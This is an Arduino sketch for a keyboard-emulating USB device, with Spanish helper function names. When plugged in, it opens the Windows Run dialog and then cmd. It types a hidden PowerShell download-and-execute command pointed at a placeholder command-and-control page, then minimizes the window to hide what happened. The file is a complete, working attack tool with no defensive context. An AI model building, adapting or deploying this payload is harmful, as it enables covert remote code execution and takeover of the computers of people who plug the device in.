#include <Keyboard.h>

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Keyboard.begin();
  delay(500);
  Ejecutar();
  Escribir("cmd");
  Enter();
  delay(120);
  Escribir("powershell /v 2 /W hidden IEX *New/Object System.Net.Webclient(.DownloadString*");
  Keyboard.press('-');
  Keyboard.releaseAll();
  Escribir("[C2webpage]]");
  Keyboard.press('-');
  Keyboard.releaseAll();
  Escribir("(");
  Enter();
  delay(10);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(10);
  Keyboard.end();
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
}

void Enter(){
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  delay(0);
}
void Cerrar(){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_F4);
  delay(500);
}

void Escribir(char txt[]){
  Keyboard.print(txt);
  delay(0);
}

void Ejecutar(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(100);
}
